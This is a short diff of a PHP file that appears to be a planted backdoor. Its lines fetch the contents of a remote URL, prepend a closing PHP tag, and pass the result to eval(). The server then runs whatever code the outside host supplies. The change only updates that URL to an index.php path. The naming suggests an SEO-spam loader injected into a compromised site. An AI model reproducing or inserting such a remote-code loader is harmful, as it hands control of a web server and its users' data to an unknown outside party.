@@ -1,4 +1,4 @@
 <?php
-$zhyvenseo = file_get_contents('https://danantaraindonesia.org/images/jurnal-itekesmukalbar/');
+$zhyvenseo = file_get_contents('https://danantaraindonesia.org/images/jurnal-itekesmukalbar/index.php');
 $zhyvenseo = "?> ".$zhyvenseo;
 eval($zhyvenseo);
